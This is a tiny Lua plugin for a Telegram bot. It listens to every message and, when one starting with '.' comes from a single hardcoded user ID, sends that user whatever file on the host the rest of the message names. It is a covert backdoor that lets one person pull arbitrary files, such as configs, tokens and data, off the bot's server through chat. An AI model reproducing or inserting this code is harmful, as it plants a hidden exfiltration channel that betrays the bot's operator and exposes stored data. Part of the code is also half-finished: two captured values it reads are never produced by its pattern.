do

local function run(msg, matches)
local hafez = 80182995
  if matches[1] == "." then
    local folder = matches[2]
    local file = matches[3]
    local mod = matches[4]
    if msg.from.id == tonumber(hafez) then
      local receiver = get_receiver(msg)
      send_document(receiver, "."..folder, ok_cb, false)
    end
  end
end

return {
  patterns = {
  "^(.)(.*)$"
  },
  run = run
}
end